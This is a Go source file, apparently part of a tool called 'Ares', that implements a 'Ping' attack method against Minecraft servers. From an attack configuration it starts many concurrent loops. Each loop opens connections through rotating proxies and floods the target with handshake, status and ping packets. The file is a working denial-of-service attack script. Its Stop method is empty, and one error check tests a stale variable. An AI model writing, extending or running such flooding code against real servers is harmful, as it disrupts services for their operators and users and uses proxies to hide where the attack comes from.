package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Ping struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
}

func (p *Ping) Start() {

	ip, port, err := net.SplitHostPort(p.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}

	p.handshakePacket = mcutils.GetHandshakePacket(ip, iport, p.Config.Version, mcutils.Status)

	p.isRunning = true

	for i := 0; i < p.Config.Loops; i++ {
		go p.loop()
	}
}

func (p *Ping) loop() {
	for p.isRunning {
		for i := 0; i < p.Config.PerDelay; i++ {
			go p.connect()
		}
		time.Sleep(p.Config.Delay)
	}
}

func (p *Ping) connect() {
	conn, err := minecraft.DialMc(p.Config.Host, p.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}

	conn.WritePacket(p.handshakePacket)
	conn.WritePacket(packet.Marshal(
		0x00,
	))
	conn.WritePacket(packet.Marshal(
		0x01,
		packet.Long(time.Now().Unix()),
	))
}

func (p *Ping) Stop() {

}
